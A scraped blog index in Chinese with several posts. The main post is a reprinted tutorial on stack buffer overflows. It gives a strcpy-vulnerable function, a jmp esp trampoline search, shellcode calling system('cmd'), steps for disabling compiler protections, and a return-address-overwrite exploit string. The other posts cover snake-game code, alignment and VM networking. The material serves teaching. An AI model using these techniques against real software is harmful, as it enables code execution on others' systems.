tail-&gt;next; &#125;&#125;//makefoodvoid makeFood()&#123; srand(time(NULL)); food[0] = rand() % (length - 2) + 1; food[1] = rand() % (width - 2) + 1; map[food[0]][food[1]] = 1;&#125;//bitselfint bitself()&#123; snake *self; self = head-&gt;next; while (self != NULL) &#123; if (self-&gt;x == head-&gt;x &amp;&amp; self-&gt;y == head-&gt;y) &#123; return 1; &#125; self = self-&gt;next; &#125; return 0;&#125;//cross wallvoid crossWall()&#123; if (head-&gt;x == 0 || head-&gt;x == length - 1 || head-&gt;y == 0 || head-&gt;y == width - 1) &#123; endGame(); &#125;&#125;void move(snake * nextthead)&#123; if (nextthead-&gt;x == food[0] &amp;&amp; nextthead-&gt;y == food[1]) &#123; nextthead-&gt;next = head; head = nextthead; snake *q = head; while (q -&gt;next!= NULL) &#123; map[q-&gt;x][q-&gt;y] = 1; q = q-&gt;next; &#125; map[q-&gt;x][q-&gt;y] = 0; makeFood(); &#125; else &#123; nextthead-&gt;next = head; head = nextthead; snake *q = head; while (q-&gt;next-&gt;next != NULL) &#123; map[q-&gt;x][q-&gt;y] = 1; q = q-&gt;next; &#125; map[q-&gt;next-&gt;x][q-&gt;next-&gt;y] = 0; free(q-&gt;next); q-&gt;next = NULL; map[q-&gt;x][q-&gt;y] = 0; &#125; if (bitself()) &#123; endGame(); &#125;&#125;//snake movevoid snakeMove()&#123; snake *nextthead; crosswall(); nextthead = (snake *)malloc(sizeof(snake)); switch (status) &#123; case 'w': nextthead-&gt;x = head-&gt;x - 1; nextthead-&gt;y = head-&gt;y; move(nextthead); break; case 'a': nextthead-&gt;x = head-&gt;x; nextthead-&gt;y = head-&gt;y - 1; move(nextthead); break; case 's': nextthead-&gt;x = head-&gt;x + 1; nextthead-&gt;y = head-&gt;y; move(nextthead); break; case 'd': nextthead-&gt;x = head-&gt;x; nextthead-&gt;y = head-&gt;y + 1; move(nextthead); break; default: nextthead-&gt;x = head-&gt;x + 1; nextthead-&gt;y = head-&gt;y; move(nextthead); break; &#125; &#125;//cntrol gamevoid gameControl()&#123; char key = NULL; if (_kbhit()) &#123; key = _getch(); &#125; switch (key) &#123; case 'w': //up status = 'w'; break; case 'a': //left status = 'a'; break; case 's': //down status = 's'; break; case 'd': //right status = 'd'; break; &#125;&#125;//end gamevoid endGame()&#123; system(\"cls\"); printf(\"Game Over\"); system(\"pause\");&#125;//main functionint main()&#123; createMap(); createSnake(); makeFood(); init(); while (1) &#123; gameControl(); snakeMove(); Sleep(200); system(\"cls\"); init(); &#125; return 0;&#125;","categories":[{"name":"c","slug":"c","permalink":"http://coordinate.wang/categories/c/"}],"tags":[{"name":"c","slug":"c","permalink":"http://coordinate.wang/tags/c/"},{"name":"game","slug":"game","permalink":"http://coordinate.wang/tags/game/"},{"name":"贪吃蛇","slug":"贪吃蛇","permalink":"http://coordinate.wang/tags/贪吃蛇/"}]},{"title":"缓冲区溢出攻击","slug":"2017-05-23-缓冲区溢出攻击","date":"2017-05-22T16:00:00.000Z","updated":"2018-02-18T03:29:06.622Z","comments":true,"path":"2017/05/23/2017-05-23-缓冲区溢出攻击/","link":"","permalink":"http://coordinate.wang/2017/05/23/2017-05-23-缓冲区溢出攻击/","excerpt":"","text":"转载自Florian缓冲区溢出（Buffer Overflow）是计算机安全领域内既经典而又古老的话题。随着计算机系统安全性的加强，传统的缓冲区溢出攻击方式可能变得不再奏效，相应的介绍缓冲区溢出原理的资料也变得“大众化”起来。其中看雪的《0day安全：软件漏洞分析技术》一书将缓冲区溢出攻击的原理阐述得简洁明了。本文参考该书对缓冲区溢出原理的讲解，并结合实际的代码实例进行验证。不过即便如此，完成一个简单的溢出代码也需要解决很多书中无法涉及的问题，尤其是面对较新的具有安全特性的编译器——比如MS的Visual Studio2010。接下来，我们结合具体代码，按照对缓冲区溢出原理的循序渐进地理解方式去挖掘缓冲区溢出背后的底层机制。 一、代码 &lt;=&gt; 数据顾名思义，缓冲区溢出的含义是为缓冲区提供了多于其存储容量的数据，就像往杯子里倒入了过量的水一样。通常情况下，缓冲区溢出的数据只会破坏程序数据，造成意外终止。但是如果有人精心构造溢出数据的内容，那么就有可能获得系统的控制权！如果说用户（也可能是黑客）提供了水——缓冲区溢出攻击的数据，那么系统提供了溢出的容器——缓冲区。缓冲区在系统中的表现形式是多样的，高级语言定义的变量、数组、结构体等在运行时可以说都是保存在缓冲区内的，因此所谓缓冲区可以更抽象地理解为一段可读写的内存区域，缓冲区攻击的最终目的就是希望系统能执行这块可读写内存中已经被蓄意设定好的恶意代码。按照冯·诺依曼存储程序原理，程序代码是作为二进制数据存储在内存的，同样程序的数据也在内存中，因此直接从内存的二进制形式上是无法区分哪些是数据哪些是代码的，这也为缓冲区溢出攻击提供了可能。 图1 进程地址空间分布图1是进程地址空间分布的简单表示。代码存储了用户程序的所有可执行代码，在程序正常执行的情况下，程序计数器（PC指针）只会在代码段和操作系统地址空间（内核态）内寻址。数据段内存储了用户程序的全局变量，文字池等。栈空间存储了用户程序的函数栈帧（包括参数、局部数据等），实现函数调用机制，它的数据增长方向是低地址方向。堆空间存储了程序运行时动态申请的内存数据等，数据增长方向是高地址方向。除了代码段和受操作系统保护的数据区域，其他的内存区域都可能作为缓冲区，因此缓冲区溢出的位置可能在数据段，也可能在堆、栈段。如果程序的代码有软件漏洞，恶意程序会“教唆”程序计数器从上述缓冲区内取指，执行恶意程序提供的数据代码！本文分析并实现栈溢出攻击方式。 二、函数栈帧栈的主要功能是实现函数的调用。因此在介绍栈溢出原理之前，需要弄清函数调用时栈空间发生了怎样的变化。每次函数调用时，系统会把函数的返回地址（函数调用指令后紧跟指令的地址），一些关键的寄存器值保存在栈内，函数的实际参数和局部变量（包括数据、结构体、对象等）也会保存在栈内。这些数据统称为函数调用的栈帧，而且是每次函数调用都会有个独立的栈帧，这也为递归函数的实现提供了可能。 图2 函数栈帧如图所示，我们定义了一个简单的函数function，它接受一个整形参数，做一次乘法操作并返回。当调用function(0)时，arg参数记录了值0入栈，并将call function指令下一条指令的地址0x00bd16f0保存到栈内，然后跳转到function函数内部执行。每个函数定义都会有函数头和函数尾代码，如图绿框表示。因为函数内需要用ebp保存函数栈帧基址，因此先保存ebp原来的值到栈内，然后将栈指针esp内容保存到ebp。函数返回前需要做相反的操作——将esp指针恢复，并弹出ebp。这样，函数内正常情况下无论怎样使用栈，都不会使栈失去平衡。sub esp,44h指令为局部变量开辟了栈空间，比如ret变量的位置。理论上，function只需要再开辟4字节空间保存ret即可，但是编译器开辟了更多的空间（这个问题很诡异，你觉得呢？）。函数调用结束返回后，函数栈帧恢复到保存参数0时的状态，为了保持栈帧平衡，需要恢复esp的内容，使用add esp,4将压入的参数弹出 。之所以会有缓冲区溢出的可能，主要是因为栈空间内保存了函数的返回地址。该地址保存了函数调用结束后后续执行的指令的位置，对于计算机安全来说，该信息是很敏感的。如果有人恶意修改了这个返回地址，并使该返回地址指向了一个新的代码位置，程序便能从其它位置继续执行。 三、栈溢出基本原理上边给出的代码是无法进行溢出操作的，因为用户没有“插足”的机会。但是实际上很多程序都会接受用户的外界输入，尤其是当函数内的一个数组缓冲区接受用户输入的时候，一旦程序代码未对输入的长度进行合法性检查的话，缓冲区溢出便有可能触发！比如下边的一个简单的函数。 12345void fun(unsigned char *data)&#123; unsigned char buffer[BUF_LEN]; strcpy((char*)buffer,(char*)data);//溢出点&#125; 这个函数没有做什么有“意义”的事情（这里主要是为了简化问题），但是它是一个典型的栈溢出代码。在使用不安全的strcpy库函数时，系统会盲目地将data的全部数据拷贝到buffer指向的内存区域。buffer的长度是有限的，一旦data的数据长度超过BUF_LEN，便会产生缓冲区溢出。 图3 缓冲区溢出由于栈是低地址方向增长的，因此局部数组buffer的指针在缓冲区的下方。当把data的数据拷贝到buffer内时，超过缓冲区区域的高地址部分数据会“淹没”原本的其他栈帧数据，根据淹没数据的内容不同，可能会有产生以下情况： 淹没了其他的局部变量。如果被淹没的局部变量是条件变量，那么可能会改变函数原本的执行流程。这种方式可以用于破解简单的软件验证。 淹没了ebp的值。修改了函数执行结束后要恢复的栈指针，将会导致栈帧失去平衡。 淹没了返回地址。这是栈溢出原理的核心所在，通过淹没的方式修改函数的返回地址，使程序代码执行“意外”的流程！ 淹没参数变量。修改函数的参数变量也可能改变当前函数的执行结果和流程。 淹没上级函数的栈帧，情况与上述4点类似，只不过影响的是上级函数的执行。当然这里的前提是保证函数能正常返回，即函数地址不能被随意修改（这可能很麻烦！）。 如果在data本身的数据内就保存了一系列的指令的二进制代码，一旦栈溢出修改了函数的返回地址，并将该地址指向这段二进制代码的其实位置，那么就完成了基本的溢出攻击行为。 图4 基本栈溢出攻击通过计算返回地址内存区域相对于buffer的偏移，并在对应位置构造新的地址指向buffer内部二进制代码的其实位置，便能执行用户的自定义代码！这段既是代码又是数据的二进制数据被称为shellcode，因为攻击者希望通过这段代码打开系统的shell，以执行任意的操作系统命令——比如下载病毒，安装木马，开放端口，格式化磁盘等恶意操作。 四、栈溢出攻击上述过程虽然理论上能完成栈溢出攻击行为，但是实际上很难实现。操作系统每次加载可执行文件到进程空间的位置都是无法预测的，因此栈的位置实际是不固定的，通过硬编码覆盖新返回地址的方式并不可靠。为了能准确定位shellcode的地址，需要借助一些额外的操作，其中最经典的是借助跳板的栈溢出方式。根据前边所述，函数执行后，栈指针esp会恢复到压入参数时的状态，在图4中即data参数的地址。如果我们在函数的返回地址填入一个地址，该地址指向的内存保存了一条特殊的指令jmp esp——跳板。那么函数返回后，会执行该指令并跳转到esp所在的位置——即data的位置。我们可以将缓冲区再多溢出一部分，淹没data这样的函数参数，并在这里放上我们想要执行的代码！这样，不管程序被加载到哪个位置，最终都会回来执行栈内的代码。 图5 借助跳板的栈溢出攻击借助于跳板的确可以很好的解决栈帧移位（栈加载地址不固定）的问题，但是跳板指令从哪找呢？“幸运”的是，在Windows操作系统加载的大量dll中，包含了许多这样的指令，比如kernel32.dll，ntdll.dll，这两个动态链接库是Windows程序默认加载的。如果是图形化界面的Windows程序还会加载user32.dll，它也包含了大量的跳板指令！而且更“神奇”的是Windows操作系统加载dll时候一般都是固定地址，因此这些dll内的跳板指令的地址一般都是固定的。我们可以离线搜索出跳板执行在dll内的偏移，并加上dll的加载地址，便得到一个适用的跳板指令地址！ 123456789101112//查询dll内第一个jmp esp指令的位置int findJmp(char*dll_name)&#123; char* handle=(char*)LoadLibraryA(dll_name);//获取dll加载地址 for(int pos=0;;pos++)//遍历dll代码空间 &#123; if(handle[pos]==(char)0xff&amp;&amp;handle[pos+1]==(char)0xe4)//寻找0xffe4 = jmp esp &#123; return (int)(handle+pos); &#125; &#125;&#125; 这里简化了搜索算法，输出第一个跳板指令的地址，读者可以选取其他更合适位置。LoadLibraryA库函数返回值就是dll的加载地址，然后加上搜索到的跳板指令偏移pos便是最终地址。jmp esp指令的二进制表示为0xffe4，因此搜索算法就是搜索dll内这样的字节数据即可。虽然如此，上述的攻击方式还不够好。因为在esp后继续追加shellcode代码会将上级函数的栈帧淹没，这样做并没有什么好处，甚至可能会带来运行时问题。既然被溢出的函数栈帧内提供了缓冲区，我们还是把核心的shellcode放在缓冲区内，而在esp之后放上跳转指令转移到原本的缓冲区位置。由于这样做使代码的位置在esp指针之前，如果shellcode中使用了push指令便会让esp指令与shellcode代码越来越近，甚至淹没自身的代码。这显然不是我们想要的结果，因此我们可以强制抬高esp指针，使它在shellcode之前（低地址位置），这样就能在shellcode内正常使用push指令了。 图6 调整shellcode与栈指针调整代码的内容很简单： 12add esp,-Xjmp esp 第一条指令抬高了栈指针到shellcode之前。X代表shellcode起始地址与esp的偏移。如果shellcode从缓冲区起始位置开始，那么就是buffer的地址偏移。这里不使用sub esp,X指令主要是避免X的高位字节为0的问题，很多情况下缓冲区溢出是针对字符串缓冲区的，如果出现字节0会导致缓冲区截断，从而导致溢出失败。第二条指令就是跳转到shellcode的起始位置继续执行。（又是jmp esp！）通过上述方式便能获得一个较为稳定的栈溢出攻击。 五、shellcode构造shellcode实质是指溢出后执行的能开启系统shell的代码。但是在缓冲区溢出攻击时，也可以将整个触发缓冲区溢出攻击过程的代码统称为shellcode，按照这种定义可以把shellcode分为四部分： 核心shellcode代码，包含了攻击者要执行的所有代码。 溢出地址，是触发shellcode的关键所在。 填充物，填充未使用的缓冲区，用于控制溢出地址的位置，一般使用nop指令填充——0x90表示。 结束符号0，对于符号串shellcode需要用0结尾，避免溢出时字符串异常。 前边一直在围绕溢出地址讨论，并解决了shellcode组织的问题，而最核心的代码如何构造并未提及——即攻击成功后做的事情。其实一旦缓冲区溢出攻击成功后，如果被攻击的程序有系统的root权限——比如系统服务程序，那么攻击者基本上可以为所欲为了！但是我们需要清楚的是，核心shellcode必须是二进制代码形式。而且shellcode执行时是在远程的计算机上，因此shellcode是否能通用是一个很复杂的问题。我们可以用一段简单的代码实例来说明这个问题 。缓冲区溢出成功后，一般大家都会希望开启一个远程的shell控制被攻击的计算机。开启shell最直接的方式便是调用C语言的库函数system，该函数可以执行操作系统的命令，就像我们在命令行下执行命令那样。假如我们执行cmd命令——在远程计算机上启动一个命令提示终端（我们可能还不能和它交互，但是可以在这之前建立一个远程管道等），这里仅作为实例测试。为了使system函数调用成功，我们需要将“cmd”字符串内容压入栈空间，并将其地址压入作为system函数的参数，然后使用call指令调用system函数的地址，完成函数的执行。但是这样做还不够，如果被溢出的程序没有加载C语言库的话，我们还需要调用Windows的API Loadlibrary加载C语言的库msvcrt.dll，类似的我们也需要为字符串“msvcrt.dll”开辟栈空间。 1234567891011121314151617181920xor ebx,ebx ;//ebx=0push 0x3f3f6c6c ;//ll??push 0x642e7472 ;//rt.dpush 0x6376736d ;//msvcmov [esp+10],ebx ;//&apos;?&apos;-&gt;&apos;0&apos;mov [esp+11],ebx ;//&apos;?&apos;-&gt;&apos;0&apos;mov eax,esp ;//&quot;msvcrt.dll&quot;地址push eax ;//&quot;msvcrt.dll&quot;mov eax,0x77b62864 ;//kernel32.dll:LoadLibraryAcall eax ;//LoadLibraryA(&quot;msvcrt.dll&quot;)add esp,16push 0x3f646d63 ;//&quot;cmd?&quot;mov [esp+3],ebx ;//&apos;?&apos;-&gt;&apos;\\0&apos;mov eax,esp;//&quot;cmd&quot;地址push eax ;//&quot;cmd&quot;mov eax,0x774ab16f ;//msvcrt.dll:systemcall eax ;//system(&quot;cmd&quot;)add esp,8 上述汇编代码实质上是如下两个函数调用语句： 12Loadlibrary(“msvcrt.dll”);system(“cmd”); 不过在构造这段汇编代码时需要注意不能出现字节0，为了填充字符串的结束字符，我们使用已经初始化为0的ebx寄存器代替。另外，在对库函数调用的时候需要提前计算出函数的地址，如Loadlibrary函数的0x77b62864。计算方式如下： 12345int findFunc(char*dll_name,char*func_name)&#123; HINSTANCE handle=LoadLibraryA(dll_name);//获取dll加载地址 return (int)GetProcAddress(handle,func_name);&#125; 这个函数地址是在本地计算的，如果被攻击计算机的操作系统版本差别较大的话，这个地址可能是错误的。不过在《0day安全：软件漏洞分析技术》中，作者提供了一个更好的方式，感兴趣的读者可以参考该书提供的代码。因此构造一个通用的shellcode并非十分容易，如果想让攻击变得有效的话。 六、汇编语言自动转换写出shellcode后（无论是简单的还是通用的），我们还需要将这段汇编代码转换为机器代码。如果读者对x86汇编十分熟悉的话，选择手工敲出二进制代码的话也未尝不可。不过我们都希望能让计算机帮助做完这些事，既然开发环境提供了编译器，用它们帮忙何乐而不为呢？既不用OllyDbg工具，也不适用其他的第三方工具，我们写一个简单的函数来完成这个工作。 1234567891011121314151617181920212223242526272829//将内嵌汇编的二进制指令dump到文件,style指定输出数组格式还是二进制形式，返回代码长度int dumpCode(unsigned char*buffer)&#123; goto END ;//略过汇编代码BEGIN: __asm &#123; //在这里定义任意的合法汇编代码 &#125;END: //确定代码范围 UINT begin,end; __asm &#123; mov eax,BEGIN ; mov begin,eax ; mov eax,END ; mov end,eax ; &#125; //输出 int len=end-begin; memcpy(buffer,(void*)begin,len); //四字节对齐 int fill=(len-len%4)%4; while(fill--)buffer[len+fill]=0x90; //返回长度 return len+fill;&#125; 因为C++是支持嵌入式汇编代码的，因此在函数内的汇编代码都会被整成编译为二进制代码。实现二进制转换的基本思想是读取编译器最终生成的二进制代码段数据，将数据导出到指定的缓冲区内。为了锁定嵌入式汇编代码的位置和长度，我们定义了两个标签BEGIN和END。这两个标签在汇编语言级别会被解析为实际的线性地址，但是在高级语言级是无法直接使用这两个标签值的，只能使用goto语句跳转使用它们。但是我们可以顺水推舟，使用两个局部变量在汇编级记录这两个标签的值！ 123456789//确定代码范围UINT begin,end;__asm&#123; mov eax,BEGIN ; mov begin,eax ; mov eax,END ; mov end,eax ;&#125; 这样就可以得到嵌入式汇编的代码范围了，使用memcpy操作将代码数据拷贝到目标缓冲区即可（后边还用nop指令将代码按照四字节对齐）。不过我们还需要注意一个问题，嵌入式汇编在函数执行时也会执行，这显然不可以，我们只是把它当作数据而已（是数据？还是代码？），因此在函数开始的地方我们使用goto语句直接跳转到嵌入式会变语句的结尾——END标签！ 七、攻击测试按照上述内容，相信不难构造出一个简单的shellcode并攻击之前提供的漏洞函数。但是如果使用VS2010测试的话可能会碰到很多问题。经过大量的调试和资料查询，我们需要设置三处VS的项目属性。 配置-&gt;配置属性-&gt;C/C++-&gt;基本运行时检查=默认值，避免被检测栈帧失衡。 配置-&gt;配置属性-&gt;C/C++-&gt;缓冲区安全检查=否，避免识别缓冲区溢出漏洞。 配置-&gt;配置属性-&gt;链接器-&gt;高级-&gt;数据执行保护(DEP)=否，避免堆栈段不可执行。 从这三处设置看来，目前的编译器已经针对缓冲区溢出攻击做了大量的保护工作（显然这会降低程序的执行性能，因此允许用户配置），使得传统的缓冲区溢出攻击变得没那么“猖狂”了，但是在计算机安全领域，“道高一尺，魔高一丈”，总有人会找到更隐蔽的攻击方式让编译器开发者措手不及。本文除了分析缓冲区溢出攻击的原理之外，更希望读者能从中感受到代码安全的重要性，并结合编译器提供的安全功能让自己的代码更加安全高效。","categories":[{"name":"信息安全","slug":"信息安全","permalink":"http://coordinate.wang/categories/信息安全/"}],"tags":[{"name":"原理","slug":"原理","permalink":"http://coordinate.wang/tags/原理/"},{"name":"转载","slug":"转载","permalink":"http://coordinate.wang/tags/转载/"},{"name":"缓冲区溢出","slug":"缓冲区溢出","permalink":"http://coordinate.wang/tags/缓冲区溢出/"},{"name":"漏洞","slug":"漏洞","permalink":"http://coordinate.wang/tags/漏洞/"}]},{"title":"复杂数据类型的机器级表示（2）","slug":"2017-05-22-复杂数据类型的机器级表示2","date":"2017-05-21T16:00:00.000Z","updated":"2018-02-18T03:29:06.606Z","comments":true,"path":"2017/05/22/2017-05-22-复杂数据类型的机器级表示2/","link":"","permalink":"http://coordinate.wang/2017/05/22/2017-05-22-复杂数据类型的机器级表示2/","excerpt":"","text":"数据的对齐方式数据的对齐Alignment:要求数据的地址是相应的边界地址各种不同长度的数据存放时，有两种处理方式：按边界存放（若一个字为32位）、不按边界存放（可能会增加访问次数）虽简单的策略是：按其数据长度进行对齐。例如，Windows采用策略，int型地址是4的倍数，short型地址是2的倍数，double和long long 型的是8的倍数，float型的是4的倍数，char不对齐；linux采用更宽松的策略，short型是2的倍数，其他类型如int、float、double和指针都是4的倍数。要注意的是不要讲数据类型的大小与对齐的倍数混淆，数据类型的大小linux和windows基本是一样的，只是对齐方式不一样。在linux中 long long 是8个字节但是他是按照4字节对齐的。例如： 1234567struct SDT&#123; int i; short si; double d; char c;&#125;sa[10]; 注意结构数组变量的最末可能需要插空，以使每个数组元素都按4字节边界对齐，但是如果不是数组的话，那就可以节省3个字节的空间 对齐（Alignment）如：int I,short k,double x,char c,short j如果是边界对齐的情况&amp;i=0;&amp;k=4;&amp;x=8;&amp;c=16;&amp;j=18;x：2个周期j：1个周期如果边界不对齐的情况&amp;i=0;&amp;k=4;&amp;x=6;&amp;c=14;&amp;j=15;x：3个周期j：2个周期 对齐方式的设定1#pragma pack(n) 为编译器指定结构体和类内部的成员变量的对齐方式当自然边界（如int型按4字节、short型按2字节、float按4字节）比n大时，按照n字节对齐。缺省或#pragma pack()，按自然边界对齐。 1__attribute__((aligned(m))) 为编译器指定一个结构体或类或联合体或一个单独的变量的对齐方式 。按m字节对齐，且其占用空间大小也是m的整数倍，以保证在申请连续存储空间时各元素也按m字节对齐。 1__attribute__((packed)) 不对齐 例如 1234567891011121314#pragma pack(4)typedef struct &#123; uint32_t f1; uint8_t f2; uint8_t f3; uint32_t f4; uint64_t f5;&#125;__attribute__((aligned(1024)))ts;sizeof(ts)==1024f1 on address:0x0f2 on address:0x4f3 on address:0x5f4 on address:0x8f5 on address:0xc 越界访问和缓冲区溢出C语言程序中对数组的访问可能会有意或无意地超越数组存储区范围而无法发现。数组存储区可以看成是一个缓冲区，超越数组存储区范围的写入操作称为缓冲区溢出。例子： 1234567891011121314151617#include &lt;stdio.h&gt;#include &lt;string.h&gt;void outputs(char *str)&#123; char buffer[16]; strcpy(buffer , str); printf(\"%s \\n\", buffer);&#125;void hacker(void)&#123; printf(\"being hacked\\n\");&#125;int main(int argc,char *argv[])&#123; outputs(argv[1]); return 0;&#125; UNIX/Linux系统中，可通过调用execve函数来加载并执行程序 12#include&lt;unistd.h&gt;int execve(const char * filename,char * const argv[ ],char * const envp[ ]); execve()用来执行参数filename字符串所代表的文件路径，第二个参数是利用指针数组来传递给执行文件，并且需要以空指针(NULL)结束，最后一个参数则为传递给执行文件的新环境变量数组。在历史上，大多数UNIX系统对main函数提供了三个参数，原型如下： 1int main(int argc, char *argv[], char *env[] ); 其中第三个参数是环境表地址。ANSI C规定main函数只有两个参数，而且第三个参数与全局变量environ相比也没有带来更多益处，所以POSIX.1也规定应使用environ而不使 用第三个参数。通常用getenv和putenv函数来存取特定的环境变量，而不是用environ变量。 1234567891011121314//假设hacker首地址0x08048411#include &lt;stdio.h&gt;char shellcode[]=\"./ceshi\"\"0123456789ABCDEFXXXX\"\"\\x11\\x84\\x04\\x08\"\"\\x00\";int main(void )&#123; char *argv; argv = shellcode; execve(argv[0], argv, NULL); return 0;&#125;","categories":[{"name":"计算机网络","slug":"计算机网络","permalink":"http://coordinate.wang/categories/计算机网络/"}],"tags":[{"name":"notes","slug":"notes","permalink":"http://coordinate.wang/tags/notes/"},{"name":"原理","slug":"原理","permalink":"http://coordinate.wang/tags/原理/"},{"name":"计算机网络","slug":"计算机网络","permalink":"http://coordinate.wang/tags/计算机网络/"}]},{"title":"搞定VM桥接","slug":"2017-05-19-搞定VM桥接","date":"2017-05-18T16:00:00.000Z","updated":"2018-02-18T03:29:06.601Z","comments":true,"path":"2017/05/19/2017-05-19-搞定VM桥接/","link":"","permalink":"http://coordinate.wang/2017/05/19/2017-05-19-搞定VM桥接/","excerpt":"","text":"0x01首先要确定是不是有Vmnet0桥接模式，有的话桥接本地有线网卡，不设置自动。 点击编辑，打开虚拟网络编辑选项 点击更改设置后出现，相关的VMnet 注意我这里是配置好的结果，没配置好的话，是没有VMnet0的 0x02没有的话按一下步骤： win+r打开运行，输入devmgmt.msc后出现设备管理器，在网络适配器中查看是否有VMware相关的选项，一个是1一个是8，把这两个虚拟网卡卸载。 回到虚拟网络编辑界面，将VMnet1和VMnet8移除，然后点击还原默认选项，还原好后基本上都ok。可以经行验证，和前面方法一样，只是在点击更改设置后多出来一个VMnet0 选中要设置的虚拟机，右击选设置选项，出现设置画面，点击网络设配器 点击桥接模式，点击复制物理连接状态，这时候不要急着点击确定还有一步。 Vm的MAC地址要和本地网卡一致。！！！！ important，否则无法成功，网上别人都是这样失败的。 点击高级选项，在mac地址栏填上主机的mac地址，点击确定。 结束语我决定要好好研究研究计算机网络^_^!","categories":[{"name":"计算机网络","slug":"计算机网络","permalink":"http://coordinate.wang/categories/计算机网络/"}],"tags":[{"name":"原理","slug":"原理","permalink":"http://coordinate.wang/tags/原理/"},{"name":"vmware","slug":"vmware","permalink":"http://coordinate.wang/tags/vmware/"},{"name":"计算机网络","slug":"计算机网络","permalink":"http://coordinate.wang/tags/计算机网络/"}]},{"title":"复杂数据类型的机器级表示（1）","slug":"2017-05-16-复杂数据类型的机器级表示1","date":"2017-05-15T16:00:00.000Z","updated":"2018-02-18T03:29:06.592Z","comments":true,"path":"2017/05/16/2017-05-16-复杂数据类型的机器级表示1/","link":"","permalink":"http://coordinate.wang/2017/05/16/2017-05-16-复杂数据类型的机器级表示1/","excerpt":"","text":"数组和指针类型的分配和访问例如，定义一个具有4个元素的静态存储型short数据类型数组A，可以写成“static short [A];”第i个元素的地址计算公式为$$\\&amp;A[0]+2*i$$。假定数组A的首地址存放在EDX中，i存放在ECX中，现要将A[I]取到AX中，则所用的汇编指令： 1movw (%edx,%ecx,2),%eax 其中ECX为变址寄存器，在循环中增量 分配在静态区的数组的初始化和访问 12345678910int buf[2] = &#123;10,20&#125;;int main()&#123; int i,sum = 0; for(i = 0; i &lt; 2; ++i) &#123; sum += buf[i]; &#125; return sum;&#125; buf是在静态区分配的数组，连接后，buf在可执行目标文件的数据段中分配空间 auto型数组的初始化和访问 12345678910int adder()&#123; int buf[2] = &#123;10,20&#125;; int i,sum = 0; for(i = 0; i &lt;2;++i) &#123; sum += buf[i]; &#125; return sum;&#125; 分配在栈中，故数组首地址通过EBP来定位。 在指针的目标数据与数组类型相同的前提下，指针变量可以指向数组或数组中的任意元素。 12int a[10];int *ptr = &amp;a[0]; 这个程序的功能就是使ptr指向数组啊的第0个元素a[0]。a的值就是其首地址，即a=&amp;a[0]，因而a=ptr，从而有$$\\&amp;a[i] = ptr+i=a+i$$以及$$a[i]=ptr[i]=(ptr+i)=(a+i)$$ 结构和联合数据结构体数据的分配和访问结构体成员在内存中主要分为：分配在栈中的auto结构性变量的首地址由EBP或ESP来定位，分配在静态区的结构型变量首地址是一个确定的静态区地址。结构性变量x各成员首地址可用“基址加偏移量”的寻址方式 123456789struct cont_info&#123; char id[8]; char name[12]; unsigned post; char address[100]; char phone[20];&#125;unsigned xpost = x.post;//movl 20(%edx),%eax偏移量是20 结构体数据作为入口参数 12345678void stu_phone1(struct cont_info *s_info_ptr)&#123; printf(\"%s phone number: %s\", (*s_info_ptr).name, (*s_info_ptr).phone);&#125;void stu_phone2(struct cont_info s_info)&#123; printf(\"%s phone number: %s\", s_info.name, s_info.phone);&#125; 结构体变量需要作为一个函数参数时，形参和调用函数中的实参具有相同结构。若采用按值传递，则结构成员都要复制到栈中的参数区，这既增加时间又增加空间，且更新后数据无法在调用中使用。 (*stu_info_ptr).name可写为stu_info_ptr-&gt;name 执行以下两条指令后 12movl 8(%ebp),%edxleal 8(%edx),%eax EAX中存放的是字符串 stu_info.name送EAX的指令序列为： 12leal 8(%ebp),%edxleal 8(%edx),%eax 很明显第二种做法开销很大 联合体数据的分配和访问联合体各成员共享存储空间，按最大长度成员所需空间大小为准 1234567union_uarea&#123; char c_data; short s_data; int i_data; long l_data;&#125; 在IA-32中占用4个字节。当事先知道某种数据结构中的不同字段的使用时间是互斥的，就可以将这些字段声明为union，以减少空间。 实现对相同序列的不同数据类型解释 1234567891011unsigned float2unsign(float f)&#123; union &#123; float f; unsigned u; &#125;tmp_union; tmp_union.f = f; return tmp_union.u;&#125; 过程体为： 123movl 8(%ebp),%eaxmovl %eax,-4(%ebp)movl -4(%ebp),%eax 最后两条指令会被优化掉结果就是float转化为unsigned但是没有使用内部装换所以，float2unsign(10.0)=1092616192 利用嵌套定义链表结构 1234567891011121314151617union node&#123; struct &#123; int *pre; int data1; &#125;node1; struct &#123; int data2; union node *next; &#125;node2;&#125;void node_proc( union node *np)&#123; np-&gt;node2.next-&gt;node1.data1=*(np-&gt;node2.next-&gt;node1.ptr)+np-&gt;node2.data2;&#125; 123456movl 8(%ebp),%ecxmovl 4(%ecx),%edxmovl (%edx),%eaxmovl (%eax),%eaxaddl (%ecx),%eaxmovl %eax,4(%edx)","categories":[{"name":"计算机系统原理","slug":"计算机系统原理","permalink":"http://coordinate.wang/categories/计算机系统原理/"}],"tags":[{"name":"notes","slug":"notes","permalink":"http://coordinate.wang/tags/notes/"},{"name":"原理","slug":"原理","permalink":"http://coordinate.wang/tags/原理/"}]},{"title":"C语言语句的机器级表示","slug":"2017-05-14-C语言语句的机器级表示","date":"2017-05-13T16:00:00.000Z","updated":"2018-02-18T03:29:06.553Z","comments":true,"path":"2017/05/14/2017-05-14-C语言语句的机器级表示/","link":"","permalink":"http://coordinate.wang/2017/05/14/2017-05-14-C语言语句的机器级表示/","excerpt":"","text":"过程调用的机器级表示1234567891011int add(int x,int y)&#123; return x+y;&#125;int main()&#123; int t1 = 125; int t2 = 80; int sum = add(t1, t2); return sum;&#125; 过程调用执行步骤（P为调用者，Q为被调用者） P将入口参数放到Q能访问到的地方 P保存返回地址，然后将控制转移到Q；call指令 Q保存P的现场，并为自己的非静态局部变量分配空间 回复Q的过程体； Q恢复P的现场，释放局部变量空间； Q取出返回地址，将控制转移到P；RET指令 IA-32的寄存器使用约定：调用者P保存寄存器（EAX、EDX、ECX），Q可直接使用这三个寄存器。若P在从Q返回后还要用的话，P应在转到Q之前先保存，并在从Q返回后先恢复它们的值再使用。被调用者Q保存寄存器（EBX、ESI、EDI）。Q必须先将它们的值保存在栈中在使用它们，并在返回P之前恢复它们的值。EBP和ESP分别是帧指针寄存器和栈指针寄存器，分别用来指向当前栈帧的底部和顶部。 入口参数位置movl 参数3,8(%esp)movl 参数2,4(%esp)movl 参数1,(%esp)call addcall:R[esp]&lt;-R[esp]-4M[R[esp]] 返回地址（call指令的下一条指令的地址）R[eip] add函数首地址每个过程开始两条指令pushl %ebpmovl %esp,%ebp 例子：应始终返回d[0]中的3.14，但是并非如此 1234567double fun(int i)&#123; volatile double d[1] = &#123;3.14&#125;; volatile long int a[2]; a[i] = 1073741824; return d[0];&#125; 